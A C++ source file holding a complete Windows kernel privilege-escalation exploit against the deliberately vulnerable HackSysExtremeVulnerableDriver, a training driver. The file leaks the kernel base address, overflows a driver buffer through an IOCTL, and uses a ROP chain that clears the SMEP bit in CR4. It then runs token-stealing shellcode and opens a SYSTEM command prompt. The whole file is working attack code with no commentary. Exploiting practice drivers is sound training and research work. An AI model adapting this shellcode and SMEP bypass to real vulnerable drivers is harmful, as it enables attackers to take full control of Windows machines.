#pragma once

#include <iostream>
#include <windows.h>
#include <cstdio>
#include <psapi.h>
#include <wincrypt.h>
#include <tchar.h>



unsigned long long get_kernel_base_addr() {
	LPVOID drivers[1024];
	DWORD cbNeeded;

	EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);

	return (unsigned long long)drivers[0];
}


int main()
{
	PVOID kernelBaseAddr;

	kernelBaseAddr = (PVOID)get_kernel_base_addr();
	printf("[+]Kernel Base address %p\n", kernelBaseAddr);



	LPCSTR symlink_driver = "\\\\.\\HackSysExtremeVulnerableDriver";
	HANDLE hdriver = CreateFileA(symlink_driver, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (!hdriver)
	{
		printf("Failed to get handle =(\n");
	}
	else {
		printf("[+]HEVD Base address %p\n", hdriver);
	}

	BYTE shellcode[] = "\x65\x48\xa1\x88\x01\x00\x00\x00\x00\x00\x00\x48\x8b\x80\xb8\x00\x00\x00\x49\x89\xc7\x4d\x8b\xbf\x48\x04\x00\x00\x49\x81\xef\x48\x04\x00\x00\x49\x8b\x8f\x40\x04\x00\x00\x48\x83\xf9\x04\x75\xe5\x49\x8b\x8f\xb8\x04\x00\x00\x80\xe1\xf0\x48\x89\x88\xb8\x04\x00\x00\x48\x83\xc4\x10\x4d\x31\xff\x4d\x31\xe4\x4d\x31\xf6\x48\x31\xc0\xc3";




	LPVOID payload = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(payload, shellcode, sizeof(shellcode));

	BYTE mem[2104] = { 0 };

	memset(mem, '\x41', 2072);
	INT64 rop_ret = (INT64)(((PCHAR)kernelBaseAddr) + 0x014c8);
	INT64 pop_rcx = (INT64)(((PCHAR)kernelBaseAddr) + 0xe37a);
	INT64 cr4_value = 0x506f8;
	INT64 mov_rcx_cr4 = (INT64)(((PCHAR)kernelBaseAddr) + 0x3ea04);


	memcpy(mem + 2072, (PINT64)&pop_rcx, 8);
	memcpy(mem + 2080, (PINT64)&cr4_value, 8);
	memcpy(mem + 2088, (PINT64)&mov_rcx_cr4, 8);
	memcpy(mem + 2096, (PINT64)&payload, 8);

	printf("[+] Ret Gadget %p\n", (PINT64)&rop_ret);
	printf("[+] Pop rcx Gadget %p\n", (PINT64)&pop_rcx);
	printf("[+] CR4 value %p\n", (PINT64)&cr4_value);
	printf("[+] Mov rcx, cr4 Gadget %p\n", (PINT64)&mov_rcx_cr4);
	printf("[+] Shellcode address %p\n", (PINT64)&payload);


	DWORD ret;


	bool result = DeviceIoControl(hdriver, 0x222003, mem, 2104, NULL, 0, &ret, NULL);;
	if (!result)
	{
		printf("IOCTL Failed: %X\n", GetLastError());
	}

	system("cmd.exe /k cd C:\\");
};
